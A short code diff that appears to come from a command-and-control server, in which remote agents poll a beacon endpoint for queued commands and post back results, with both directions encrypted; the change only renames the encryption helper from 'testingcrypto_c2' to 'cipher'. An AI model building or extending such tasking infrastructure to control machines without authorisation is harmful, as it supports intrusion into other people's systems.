@@ -42,7 +42,7 @@ def agent_beacon(name: str, ip: str, os_type: str):
     cmd_to_send = app.agents_db[name]["pending_cmd"]
     if cmd_to_send:
         app.agents_db[name]["pending_cmd"] = None
-        return testingcrypto_c2.encrypt_data({"command": cmd_to_send})
+        return cipher.encrypt_data({"command": cmd_to_send})
         
     return {"command": None}
 
@@ -50,7 +50,7 @@ def agent_beacon(name: str, ip: str, os_type: str):
 async def agent_result(request: Request):
     encrypted_data = await request.json()
 
-    data = testingcrypto_c2.decrypt_data(encrypted_data)
+    data = cipher.decrypt_data(encrypted_data)
 
     name = data.get("name")
     result_text = data.get("result")
